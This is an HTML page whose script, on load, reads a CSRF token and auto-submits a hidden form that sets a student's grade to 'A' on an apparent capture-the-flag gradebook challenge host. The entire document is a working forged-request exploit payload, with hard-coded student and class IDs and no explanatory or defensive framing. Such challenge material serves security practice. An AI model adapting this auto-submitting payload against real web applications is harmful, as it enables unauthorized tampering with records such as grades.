<!DOCTYPE html>
<html>
<head>
    <title>Submit Grade Change</title>
</head>
<body>
    <script>
    // This page should be loaded after the grade-change page
    // Extract CSRF token and auto-submit form
    
    function getCSRFToken() {
        const input = document.querySelector('input[name="csrf_token"]');
        return input ? input.value : null;
    }
    
    function submitGradeChange() {
        const csrfToken = getCSRFToken();
        if (!csrfToken) {
            console.error('CSRF token not found');
            return;
        }
        
        const targetData = JSON.parse(localStorage.getItem('gradeChangeTarget') || '{}');
        
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://gradebook-app.ctf.csaw.io/grade-change';
        
        const data = {
            student_id: targetData.student_id || 'cec61aee-395d-4281-af96-cfe05bda466e',
            class_id: targetData.class_id || 'e522382b-7643-469c-ae52-ba488f5752c6',
            grade: 'A',
            csrf_token: csrfToken
        };
        
        for (const [key, value] of Object.entries(data)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = value;
            form.appendChild(input);
        }
        
        document.body.appendChild(form);
        form.submit();
    }
    
    // Submit when page loads
    window.onload = submitGradeChange;
    </script>
</body>
</html>
